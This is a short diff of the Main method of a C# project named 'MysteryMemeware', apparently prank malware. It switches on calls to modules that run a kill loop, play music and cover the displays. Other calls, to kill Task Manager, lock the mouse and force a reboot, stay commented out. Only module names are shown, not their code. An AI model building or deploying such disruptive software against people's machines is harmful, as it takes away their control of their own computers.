@@ -18,22 +18,22 @@ namespace MysteryMemeware
         [STAThread]
         public static void Main()
         {
-            //FailSafeModule.RunKillLoop();
+            FailSafeModule.RunKillLoop();
 
             //WinLogOffModule.Reboot();
 
             //CursorSlowModule.SlowCursor();
-            VolumeModule.SetVolume();
+            //VolumeModule.SetVolume();
             //TaskMGRModule.KillTaskMGR();
             //MouseLockModule.LockMouse();
-            //MusicModule.PlayMusic();
-            //DisplayCoverModule.CoverDisplays();
+            MusicModule.PlayMusic();
+            DisplayCoverModule.CoverDisplays();
 
             //SlowCursor();
 
-           // while (true)
+            while (true)
             {
-                //System.Threading.Thread.Sleep(1000);
+                System.Threading.Thread.Sleep(1000);
             }
 
 
